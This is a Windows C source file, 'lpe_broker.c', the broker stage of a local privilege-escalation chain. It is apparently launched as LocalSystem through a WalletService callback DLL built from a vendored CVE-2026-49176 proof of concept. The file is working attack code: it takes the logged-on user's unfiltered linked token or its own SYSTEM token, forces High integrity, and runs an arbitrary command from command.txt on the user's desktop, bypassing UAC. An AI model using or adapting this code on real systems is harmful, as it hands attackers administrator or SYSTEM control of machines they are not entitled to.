/*
 * lpe_broker.c -- helper for the WalletService auto-elevation (bin\lpe\).
 *
 * Started by wallet_callback_shell.dll (running as LocalSystem inside
 * WalletService, session 0) as a demand-start service:
 *
 *     shell_broker.exe <result-file>
 *
 * 1. read <result-file-dir>\command.txt (UTF-16LE) - the command line to run;
 * 2. get a primary token for the interactive session:
 *      a) the logged-on user's token raised to High integrity (a normal admin
 *         process: user profile, tray icon, theme);
 *      b) if that fails, our own SYSTEM token (what the original PoC does);
 * 3. CreateProcessAsUser on winsta0\default;
 * 4. append "event=SYSTEM_SHELL_STARTED|FAILED ..." to the result file.
 *
 * Only our own tool is ever launched; the exploit itself lives in
 * lpe\payload\ (vendored from the CVE-2026-49176 PoC).  Pure ASCII.
 */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <shellapi.h>
#include <userenv.h>
#include <wtsapi32.h>
#include <stdio.h>
#include <string.h>

/* ---------------- tiny string helpers ---------------- */

static char* a_append(char* cursor, const char* end, const char* text)
{
    while (*text && cursor < end) *cursor++ = *text++;
    return cursor;
}

static char* a_append_num(char* cursor, const char* end, DWORD value)
{
    char digits[16];
    unsigned count = 0;
    do {
        digits[count++] = (char)('0' + value % 10);
        value /= 10;
    } while (value && count < sizeof(digits) / sizeof(digits[0]));
    while (count && cursor < end) *cursor++ = digits[--count];
    return cursor;
}

/* replace the file name of `base` with `name` */
static int sibling_path(const wchar_t* base, const wchar_t* name,
                        wchar_t* out, size_t cch)
{
    const wchar_t* p = base;
    const wchar_t* last = 0;
    size_t n, len;

    while (*p) { if (*p == L'\\' || *p == L'/') last = p; p++; }
    if (!last) return 0;
    n = (size_t)(last - base) + 1;
    if (n + wcslen(name) + 1 > cch) return 0;
    memcpy(out, base, n * sizeof(wchar_t));
    out[n] = 0;
    len = wcslen(out);
    wcscpy(out + len, name);
    return 1;
}

/* ---------------- result events ---------------- */

/* Every writer to result.txt (the vendored callback DLL and this broker) MUST
   append plain ASCII.  The original PoC pipeline reads this file with the
   default code page; a UTF-16 writer here would mix two encodings in one file
   and the trigger could never match its regex again.  command.txt is the only
   UTF-16 file and it is read only by this broker, which wrote it. */
static void append_line(const wchar_t* path, const char* line, size_t len)
{
    HANDLE file;
    DWORD  written = 0;

    file = CreateFileW(path, FILE_APPEND_DATA,
                       FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                       NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file != INVALID_HANDLE_VALUE) {
        WriteFile(file, line, (DWORD)len, &written, NULL);
        FlushFileBuffers(file);
        CloseHandle(file);
    }
}

static void write_event(const wchar_t* path, const char* name,
                        DWORD child_pid, DWORD session, DWORD error,
                        const char* how)
{
    char     line[1024];
    char*    cursor = line;
    const char* end = line + sizeof(line) - 3;

    cursor = a_append(cursor, end, "event=");
    cursor = a_append(cursor, end, name);
    cursor = a_append(cursor, end, " broker_pid=");
    cursor = a_append_num(cursor, end, GetCurrentProcessId());
    cursor = a_append(cursor, end, " child_pid=");
    cursor = a_append_num(cursor, end, child_pid);
    cursor = a_append(cursor, end, " session=");
    cursor = a_append_num(cursor, end, session);
    cursor = a_append(cursor, end, " error=");
    cursor = a_append_num(cursor, end, error);
    cursor = a_append(cursor, end, " how=");
    cursor = a_append(cursor, end, how);
    cursor = a_append(cursor, end, " user=SYSTEM\r\n");

    append_line(path, line, (size_t)(cursor - line));
}

/* Step-level diagnostics.  The trigger only matches event=SYSTEM_SHELL_*;
   everything else here is for the elevation log (bin\bypass_elevate.log),
   which shows the tail of this file when something fails. */
static void write_note(const wchar_t* path, const char* text)
{
    char     line[512];
    char*    cursor = line;
    const char* end = line + sizeof(line) - 3;

    cursor = a_append(cursor, end, "note=");
    cursor = a_append(cursor, end, text);
    cursor = a_append(cursor, end, "\r\n");
    append_line(path, line, (size_t)(cursor - line));
}

/* ---------------- command.txt ---------------- */

static int read_command(const wchar_t* cmd_path, wchar_t* out, int cch)
{
    HANDLE h;
    DWORD  size, got = 0;
    char*  buf;
    int    n, i, start = 0;

    h = CreateFileW(cmd_path, GENERIC_READ,
                    FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    size = GetFileSize(h, NULL);
    if (size == INVALID_FILE_SIZE || size < 2 || size > (DWORD)(cch * 2)) {
        CloseHandle(h);
        return 0;
    }
    buf = (char*)HeapAlloc(GetProcessHeap(), 0, size + 2);
    if (!buf) { CloseHandle(h); return 0; }
    if (!ReadFile(h, buf, size, &got, NULL)) got = 0;
    CloseHandle(h);
    buf[got] = 0;
    buf[got + 1] = 0;

    n = (int)(got / 2);
    {
        const wchar_t* src = (const wchar_t*)buf;
        if (n > 0 && src[0] == 0xFEFF) start = 1;
        for (i = 0; start + i < n && i + 1 < cch; i++) out[i] = src[start + i];
        out[i] = 0;
    }
    HeapFree(GetProcessHeap(), 0, buf);
    return out[0] != 0;
}

/* working directory of the child: removed entirely.  CreateProcessAsUserW
   failed with ERROR_DIRECTORY (267) when given a parsed directory, and the
   child derives every path from its own exe location anyway. */

/* ---------------- tokens ---------------- */

static void enable_privilege(HANDLE token, const wchar_t* name)
{
    TOKEN_PRIVILEGES tp;
    ZeroMemory(&tp, sizeof(tp));
    tp.PrivilegeCount = 1;
    if (!LookupPrivilegeValueW(NULL, name, &tp.Privileges[0].Luid)) return;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL);
}

/* Raise an existing user token to High integrity: the child is a real
   administrator without UAC, but still the logged-on user.  Requires
   SeTcbPrivilege, which a LocalSystem service holds. */
static int set_integrity_high(HANDLE token)
{
    SID_IDENTIFIER_AUTHORITY auth = SECURITY_MANDATORY_LABEL_AUTHORITY;
    PSID    sid = NULL;
    BYTE    buffer[sizeof(TOKEN_MANDATORY_LABEL) + SECURITY_MAX_SID_SIZE];
    TOKEN_MANDATORY_LABEL* tml = (TOKEN_MANDATORY_LABEL*)buffer;
    DWORD   len, size;
    BOOL    ok;

    if (!AllocateAndInitializeSid(&auth, 1, SECURITY_MANDATORY_HIGH_RID,
                                  0, 0, 0, 0, 0, 0, 0, &sid))
        return 0;
    len = GetLengthSid(sid);
    size = sizeof(TOKEN_MANDATORY_LABEL) + len;
    memset(buffer, 0, sizeof(buffer));
    tml->Label.Attributes = SE_GROUP_INTEGRITY;
    tml->Label.Sid = (PSID)(buffer + sizeof(TOKEN_MANDATORY_LABEL));
    CopyMemory(tml->Label.Sid, sid, len);
    ok = SetTokenInformation(token, TokenIntegrityLevel, buffer, size);
    FreeSid(sid);
    return ok ? 1 : 0;
}

static DWORD active_session(void)
{
    PWTS_SESSION_INFOW sessions = NULL;
    DWORD count = 0;
    DWORD session_id = WTSGetActiveConsoleSessionId();
    DWORD i;

    if (WTSEnumerateSessionsW(WTS_CURRENT_SERVER_HANDLE, 0, 1, &sessions, &count)) {
        for (i = 0; i < count; i++) {
            if (sessions[i].State == WTSActive) {
                session_id = sessions[i].SessionId;
                break;
            }
        }
        WTSFreeMemory(sessions);
    }
    return session_id;
}

static int spawn(HANDLE primary, const wchar_t* cmd, DWORD* out_pid, DWORD* out_err)
{
    STARTUPINFOW        si;
    PROCESS_INFORMATION pi;
    LPVOID   env = NULL;
    DWORD    flags = CREATE_NEW_CONSOLE;
    wchar_t* mutable_cmd;
    int      ok;

    mutable_cmd = (wchar_t*)HeapAlloc(GetProcessHeap(), 0,
                                      (wcslen(cmd) + 1) * sizeof(wchar_t));
    if (!mutable_cmd) return 0;
    wcscpy(mutable_cmd, cmd);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;
    si.lpDesktop = (LPWSTR)L"winsta0\\default";
    ZeroMemory(&pi, sizeof(pi));

    if (CreateEnvironmentBlock(&env, primary, FALSE))
        flags |= CREATE_UNICODE_ENVIRONMENT;

    /* No lpCurrentDirectory on purpose: a bad directory here fails the whole
       call with ERROR_DIRECTORY (267), and the child does not need one - it
       derives every path from its own exe location (the original PoC passes an
       explicit, hard-coded directory; we would have to parse one, so none). */
    ok = CreateProcessAsUserW(primary, NULL, mutable_cmd, NULL, NULL, FALSE,
                              flags, env, NULL, &si, &pi);
    if (ok) {
        *out_pid = pi.dwProcessId;
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    } else {
        *out_err = GetLastError();
    }
    if (env) DestroyEnvironmentBlock(env);
    HeapFree(GetProcessHeap(), 0, mutable_cmd);
    return ok ? 1 : 0;
}

/* Is this primary token actually a member of BUILTIN\Administrators?
   Integrity level alone says nothing: a UAC-filtered token can be High but
   still has the Administrators SID as deny-only. */
static int token_is_admin(HANDLE primary)
{
    SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
    PSID  admin = NULL;
    HANDLE imp = NULL;
    BOOL  member = FALSE;

    if (!AllocateAndInitializeSid(&nt, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                  DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,
                                  &admin))
        return 0;
    if (DuplicateTokenEx(primary, TOKEN_QUERY, NULL, SecurityImpersonation,
                         TokenImpersonation, &imp))
        CheckTokenMembership(imp, admin, &member);
    if (imp) CloseHandle(imp);
    FreeSid(admin);
    return member ? 1 : 0;
}

/* interactive user, but with the ELEVATED token.  WTSQueryUserToken returns
   the session's UAC-FILTERED token (High integrity is possible, yet it is not
   an Administrators member - the first integrated run produced exactly such a
   child, which then had to pop UAC anyway).  The unfiltered token is linked to
   it, and a SYSTEM caller with SeTcbPrivilege may fetch it. */
static int launch_as_user(DWORD session, const wchar_t* cmd, const wchar_t* result,
                          DWORD* out_pid)
{
    HANDLE sessionTok = NULL, tok = NULL, primary = NULL;
    DWORD  err = 0;
    char   note[192];
    int    ok = 0;

    if (!WTSQueryUserToken(session, &sessionTok)) {
        _snprintf(note, sizeof(note) - 1,
                  "user-path WTSQueryUserToken(session=%lu) err=%lu",
                  (unsigned long)session, (unsigned long)GetLastError());
        note[sizeof(note) - 1] = 0;
        write_note(result, note);
        return 0;
    }
    tok = sessionTok;

    {
        TOKEN_LINKED_TOKEN linked;
        DWORD needed = 0;

        if (GetTokenInformation(sessionTok, TokenLinkedToken,
                                &linked, sizeof(linked), &needed) && linked.LinkedToken) {
            write_note(result, "user-path using TokenLinkedToken (the unfiltered token)");
            CloseHandle(sessionTok);
            tok = linked.LinkedToken;
        } else {
            _snprintf(note, sizeof(note) - 1,
                      "user-path TokenLinkedToken err=%lu - staying with the session token",
                      (unsigned long)GetLastError());
            note[sizeof(note) - 1] = 0;
            write_note(result, note);
        }
    }

    if (!DuplicateTokenEx(tok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                          TokenPrimary, &primary)) {
        _snprintf(note, sizeof(note) - 1,
                  "user-path DuplicateTokenEx err=%lu", (unsigned long)GetLastError());
        note[sizeof(note) - 1] = 0;
        write_note(result, note);
        CloseHandle(tok);
        return 0;
    }

    if (!token_is_admin(primary)) {
        write_note(result, "user-path token is not in Administrators - "
                           "trying the SYSTEM path instead");
        CloseHandle(primary);
        CloseHandle(tok);
        return 0;
    }

    /* The linked token is High already; keep the write as belt and braces. */
    if (!set_integrity_high(primary)) {
        _snprintf(note, sizeof(note) - 1,
                  "user-path SetTokenInformation(IntegrityLevel) err=%lu (non-fatal)",
                  (unsigned long)GetLastError());
        note[sizeof(note) - 1] = 0;
        write_note(result, note);
    }

    ok = spawn(primary, cmd, out_pid, &err);
    if (!ok) {
        _snprintf(note, sizeof(note) - 1,
                  "user-path CreateProcessAsUserW err=%lu", (unsigned long)err);
        note[sizeof(note) - 1] = 0;
        write_note(result, note);
    }
    CloseHandle(primary);
    CloseHandle(tok);
    return ok;
}

/* our own SYSTEM token in the user's session (the original PoC behaviour) */
static int launch_as_system(DWORD session, const wchar_t* cmd, const wchar_t* result,
                            DWORD* out_pid, DWORD* out_err)
{
    HANDLE process_token = NULL, primary = NULL;
    DWORD  err = 0;
    char   note[192];
    int    ok = 0;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_QUERY | TOKEN_DUPLICATE |
                          TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_PRIVILEGES,
                          &process_token)) {
        _snprintf(note, sizeof(note) - 1,
                  "system-path OpenProcessToken err=%lu", (unsigned long)GetLastError());
        note[sizeof(note) - 1] = 0;
        write_note(result, note);
        return 0;
    }

    enable_privilege(process_token, L"SeAssignPrimaryTokenPrivilege");
    enable_privilege(process_token, L"SeIncreaseQuotaPrivilege");
    enable_privilege(process_token, L"SeTcbPrivilege");

    if (!DuplicateTokenEx(process_token, MAXIMUM_ALLOWED, NULL,
                          SecurityImpersonation, TokenPrimary, &primary)) {
        _snprintf(note, sizeof(note) - 1,
                  "system-path DuplicateTokenEx err=%lu", (unsigned long)GetLastError());
        note[sizeof(note) - 1] = 0;
        write_note(result, note);
        CloseHandle(process_token);
        return 0;
    }
    if (!SetTokenInformation(primary, TokenSessionId, &session, sizeof(session))) {
        _snprintf(note, sizeof(note) - 1,
                  "system-path SetTokenInformation(SessionId=%lu) err=%lu",
                  (unsigned long)session, (unsigned long)GetLastError());
        note[sizeof(note) - 1] = 0;
        write_note(result, note);
        CloseHandle(primary);
        CloseHandle(process_token);
        return 0;
    }
    ok = spawn(primary, cmd, out_pid, &err);
    if (!ok) {
        _snprintf(note, sizeof(note) - 1,
                  "system-path CreateProcessAsUserW err=%lu", (unsigned long)err);
        note[sizeof(note) - 1] = 0;
        write_note(result, note);
        *out_err = err;
    }
    CloseHandle(primary);
    CloseHandle(process_token);
    return ok;
}

int main(void)
{
    int      argc = 0;
    LPWSTR*  argv;
    wchar_t  cmd_path[MAX_PATH];
    wchar_t  cmd[2048];
    DWORD    session, child = 0, error = ERROR_SUCCESS;
    const char* how = "none";
    int      ok;

    argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (!argv || argc != 2) {
        if (argv) LocalFree(argv);
        return ERROR_INVALID_PARAMETER;
    }

    /* SYSTEM has these by default; enabling them explicitly costs nothing and
       keeps the two launch paths below independent of the default token. */
    {
        HANDLE self = NULL;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &self)) {
            enable_privilege(self, L"SeTcbPrivilege");
            enable_privilege(self, L"SeAssignPrimaryTokenPrivilege");
            enable_privilege(self, L"SeIncreaseQuotaPrivilege");
            CloseHandle(self);
        }
    }

    if (!sibling_path(argv[1], L"command.txt", cmd_path, MAX_PATH) ||
        !read_command(cmd_path, cmd, 2048)) {
        write_event(argv[1], "SYSTEM_SHELL_FAILED", 0, 0,
                    ERROR_FILE_NOT_FOUND, how);
        LocalFree(argv);
        return ERROR_FILE_NOT_FOUND;
    }

    session = active_session();
    if (session == 0xFFFFFFFF) {
        write_event(argv[1], "SYSTEM_SHELL_FAILED", 0, 0,
                    ERROR_NO_SUCH_LOGON_SESSION, how);
        LocalFree(argv);
        return ERROR_NO_SUCH_LOGON_SESSION;
    }

    how = "user-linked";
    ok = launch_as_user(session, cmd, argv[1], &child);
    if (!ok) {
        how = "system";
        ok = launch_as_system(session, cmd, argv[1], &child, &error);
    }
    if (!ok) {
        if (!error) error = GetLastError();
        write_event(argv[1], "SYSTEM_SHELL_FAILED", 0, session, error, how);
        LocalFree(argv);
        return (int)error;
    }

    write_event(argv[1], "SYSTEM_SHELL_STARTED", child, session, 0, how);
    LocalFree(argv);
    return 0;
}
